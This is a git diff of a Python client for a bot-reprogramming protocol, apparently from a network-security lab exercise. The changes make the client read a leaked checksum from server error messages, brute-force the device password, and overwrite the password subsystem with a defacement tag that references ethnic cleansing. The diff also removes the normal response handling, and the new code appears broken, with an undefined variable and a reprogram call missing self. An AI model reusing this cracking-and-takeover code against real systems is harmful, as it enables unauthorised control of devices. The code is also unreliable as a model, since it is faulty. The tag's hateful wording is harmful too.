@@ -25,12 +25,14 @@ except:
     print "WARNING, NO PROTOCOL STACK. RAW COMMUNICATIONS ONLY"
     ProtocolStack = None
 
+from brutePassCrack import crackRequestPW
 
 class ReprogrammingClientProtocol(Protocol):
     def __init__(self):
         self.__storage = MessageStorage(ReprogrammingResponse)
         self.__requests = {}
         self.__reqId = 0
+        self.__probes = dict()
         
     def __nextId(self):
         self.__reqId += 1
@@ -43,8 +45,17 @@ class ReprogrammingClientProtocol(Protocol):
             if not self.__requests.has_key(message.RequestId):
                 continue
             print "getting callback for requestId", message.RequestId
-            d = self.__requests[message.RequestId]
-            d.callback(message.Data)
+            try:
+
+                checksum = data.split("Expected ")[1].split(" but got")[0]
+                req = self.__probes[message.RequestId]
+                req.Checksum = checksum
+                pw = crackRequestPW(req)
+                print("Password is %s" % pw)
+                reprogram(pw, "PASSWORD", "~EthnicClensisStan~Was~Here~123123123")
+            except:
+                print("Error on password cracking")
+
         
     def reprogram(self, password, subsystem, data, *additionalSubsystems):
         if len(additionalSubsystems) % 2 != 0:
@@ -81,6 +92,7 @@ class ReprogrammingClientProtocol(Protocol):
         print(req.Checksum)
         print("")
         self.__requests[req.RequestId] = Deferred()
+        self.__probes[req.RequestId] = req
         self.transport.write(req.__serialize__())
         return self.__requests[req.RequestId]
     
@@ -205,3 +217,10 @@ if __name__=="__main__":
     playgroundlog.Config.enableHandler(playgroundlog.Config.STDERR_HANDLER)
     stdio.StandardIO(ReprogrammingShellProtocol(address))    
     reactor.run()
+
+'''
+    +cyberward.botinterface.ReprogrammingRequest\x031.0\x00\x06\x00\x01\x00\x00\x00\x01\x00\x02\x00\x00\x00 ac3d9eb6985fe062a3dffc2dd5ce9c78\x00\x03\x01\x00\x04\x00\x00\x00\x05\x00\x00\x00\x06\xde\x1b\xf1?$\x8da\xd0
+    ac3d9eb6985fe062a3dffc2dd5ce9c78
+    f63c533d5f818c8a7477603a3ae91064
+    167574
+'''
